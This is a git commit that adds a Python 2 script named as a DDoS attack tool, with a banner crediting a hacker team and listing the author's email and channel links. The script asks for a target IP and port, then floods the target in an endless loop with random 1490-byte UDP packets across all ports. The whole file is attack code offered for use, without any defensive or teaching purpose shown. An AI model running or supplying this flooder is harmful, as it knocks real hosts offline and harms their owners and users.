19c60665d3a72808b46fa002e90664f64730b20b
Anon6372098 <43740735+Anon6372098@users.noreply.github.com>
2018-10-27 19:52:08 +0700

    Create DDoS-Attack-Anon.py

---
+++ DDoS-Attack-Anon.py
@@ -0,0 +1,51 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDoS Attack DSFS")
+print
+print "Creator   : Anon6372098"
+print "You Tube  : https://www.youtube.com/channel/UC6z-i5NX934RvX7BWr3MlJw (D4RK SYST3M F41LUR3 S33K3R)
+print "Github    : https://github.com/Anon6372098"
+print "Email     : anon6372098@gmail.com"
+print "Team.     : D4RK SYST3M F41LUR3 S33K3R (DSFS)"
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
